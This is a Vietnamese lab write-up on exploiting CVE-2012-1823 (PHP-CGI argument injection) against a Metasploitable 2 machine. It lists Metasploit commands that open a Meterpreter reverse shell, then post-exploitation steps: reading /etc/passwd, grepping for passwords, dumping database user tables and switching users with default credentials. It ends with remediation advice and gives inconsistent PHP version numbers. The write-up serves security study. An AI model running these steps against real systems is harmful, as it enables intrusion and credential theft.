# 🛡️Remote Code Execution thông qua PHP-CGI Argument Injection
> - **Tên lỗ hỏng:** PHP CGI Argument Injection
> - **Mã CVE:** CVE-2012-1823
> - **Mức độ:** Cao
> - **Ngày phát hiện:** 2012
## 🧱 1. Mô tả lỗ hổng
Hệ thống web hiện đang chạy PHP 5.2.4 với mô hình xử lý CGI. Đây là một phiên bản đã quá cũ (phát hành năm 2007) và chứa lỗ hổng argument injection, cho phép kẻ tấn công chèn các tham số tùy ý (-d allow_url_include=on, -d auto_prepend_file=php://input, v.v...) dẫn đến thực thi mã từ xa (RCE).
## Kỹ thuật khai thác:
- Gửi một HTTP request có ? chứa argument bất hợp lệ vào php-cgi
- Truyền mã PHP độc hại thông qua POST
- Kết quả: shell được thực thi từ xa
## ⚒️ 2. Thử nghiệm thực tế
- QUYÉT MÁY CHỦ để tìm thông tin về phiên bản web server:

<img width="704" height="259" alt="image" src="https://github.com/user-attachments/assets/d9664fec-59cf-4cb9-8c63-3083583190b1" />

- Sau khi xác minh được phiên bản PHP trên web server là 5.4.2. Tìm kiếm các lỗ hổng bảo mật có liên quan:
```
sudo msfconsole
```

```
searchsploit apache | grep 5.4.2
```

```
search php_cgi
```

- Sử dụng module php_cgi_arg_injection của Metataploit để chiếm shell trên Metasploitable
```
use multi/http/php_cgi_arg_injection
```

```
set rhost <IP Metasploitable 2>
set lhost
set lport
```

```
set PAYLOAD php/meterpreter/reverse_tcp
```

```
exploit
```

```
shell
```
- ⚔️ 1. Kiểm tra thông tin hệ thống
```
uname -a          # Thông tin kernel
id                # Kiểm tra UID, GID
```

- 🔍 2. Kiểm tra các user trên hệ thống
```
cat /etc/passwd
```

- 📁 4. Khám phá thư mục home, có thể chứa thông tin nhạy cảm
```
cd /home
ls -la
```

- 🔑 5. Tìm kiếm thông tin nhạy cảm: mật khẩu, private key, cấu hình database
```
find /var/www -type f -iname "*config*.php"
```

Đặc biệt chú ý các file trong dvwa, mutillidae, phpMyAdmin, tikiwiki:
```
cat /var/www/dvwa/config/config.inc.php
cat /var/www/mutillidae/config.inc.php
```

<img width="950" height="441" alt="image" src="https://github.com/user-attachments/assets/c4b0795d-7993-4b1a-9906-8b4096b8592f" />

- 🔄 7. Nếu có thông tin đăng nhập MySQL, thử đăng nhập:
```
mysql -u root -p
```

- 🧱 8. Kiểm tra các tiến trình đang chạy, dịch vụ khả nghi
```
ps aux
```

- 🔍 1. Tìm kiếm file chứa mật khẩu trong thư mục web
```
grep -Ri 'pass\|user' /var/www/
```

- 🔍 2. Xem nội dung các thư mục /home
```
ls -la /home/msfadmin
ls -la /home/user
ls -la /home/service
```

-EXPLOIT DATABASES:
```
mysql -u root -p
```

```
show databases;
```

```
USE dvwa;
SHOW TABLES;
SELECT * FROM users;
```

```
exit
```

- THỰC HIỆN CHÍM SHELL
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
su users
```
hoặc
```
su msfadmin
# mật khẩu: msfadmin hoặc password
```

- XEM SETTING
```
show options
```
## 📉 3. Rủi ro an ninh

| Mức độ                 | Mô tả                                            |
| ---------------------- | ------------------------------------------------ |
| **Tác động**           | Toàn bộ hệ thống có thể bị chiếm quyền kiểm soát |
| **Khả năng khai thác** | Rất cao – công cụ công khai, không cần xác thực  |
| **Hậu quả tiềm ẩn**    | Rò rỉ dữ liệu, chèn web shell, pivot mạng nội bộ |

## 🧠 Vì sao lại thuộc nhóm "Vulnerable and Outdated Components"?

| Tiêu chí                                 | Có khớp không?                        |
| ---------------------------------------- | ------------------------------------- |
| ❌ Phần mềm không được cập nhật           | ✅ PHP 5.2.4 quá cũ (2007)             |
| ⚠️ Lỗ hổng đã công bố và có mã khai thác | ✅ CVE-2012-1823                       |
| 🔥 Hacker có thể khai thác từ xa         | ✅ Tấn công RCE thành công             |
| 🔐 Không có kiểm soát an ninh bù         | ✅ Không dùng WAF hoặc cấu hình bảo vệ |

## 🛡️ 4. Đề xuất khắc phục

| Hành động               | Chi tiết                                                      |
| ----------------------- | ------------------------------------------------------------- |
| 🔄 **Cập nhật PHP**     | Nâng cấp PHP lên ít nhất phiên bản **7.4 trở lên**            |
| 🔐 **Tắt PHP-CGI**      | Nếu không bắt buộc dùng CGI, tắt hoàn toàn module             |
| 🚧 **Cấu hình WAF/IDS** | Triển khai WAF (ModSecurity, v.v...) để lọc tham số nguy hiểm |
| 🧹 **Quản lý bản vá**   | Thiết lập lịch cập nhật phần mềm định kỳ                      |
## Tham Khảo
- https://github.com/0xl0k1/CVE-2012-1823
## ✅ Kết Luận
## NOTEs

- **metaploit2**

| Trường       | Giá trị    |
| ------------ | ---------- |
| **Username** | `msfadmin` |
| **Password** | `msfadmin` |

```
sudo ifconfig eth0 192.168.80.10 netmask 255.255.255.0 up 
```
